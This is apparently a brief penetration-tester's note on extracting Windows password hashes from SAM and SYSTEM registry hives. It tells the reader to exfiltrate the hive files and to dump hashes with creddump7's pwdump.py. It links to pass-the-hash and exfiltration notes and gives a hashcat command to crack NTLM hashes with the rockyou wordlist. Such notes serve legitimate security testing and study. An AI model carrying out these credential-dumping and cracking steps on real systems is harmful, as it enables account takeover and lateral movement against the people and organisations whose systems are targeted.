To extract hashes from folders/registry hives, you need both the SAM and the SYSTEM files.

First, [[Exfiltration|Exfiltrate the files to your machine]]

```
git clone https://github.com/Tib3rius/creddump7   
pip3 install pycrypto   
python3 creddump7/pwdump.py SYSTEM SAM
```

[[Passing the hash|Use a PTH attack]]
Try to crack the NTLM hash using hashcat, and save it to test for password reuse vulnerabilities:
```
hashcat -m 1000 --force <hash> /usr/share/wordlists/rockyou.txt
```
